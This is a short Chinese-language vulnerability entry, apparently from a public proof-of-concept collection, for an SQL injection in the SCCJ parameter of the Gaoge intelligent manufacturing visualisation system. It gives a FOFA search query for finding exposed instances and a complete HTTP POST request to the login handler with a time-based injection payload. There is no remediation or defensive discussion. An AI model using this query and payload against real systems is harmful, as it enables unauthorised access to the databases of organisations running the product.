## 高格智能制造目视化系统SCCJ参数存在SQL注入

## fofa
```
title="高格智能制造目视化系统"
```

## poc
```
POST /data/login.ashx HTTP/1.1
Host: target.com
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Length: 81

UNAMESM=&UNAME=&PWD=&pgbg=false&gdbg=true&SCCJ=14';WAITFOR DELAY '0:0:0'--&type=0
```
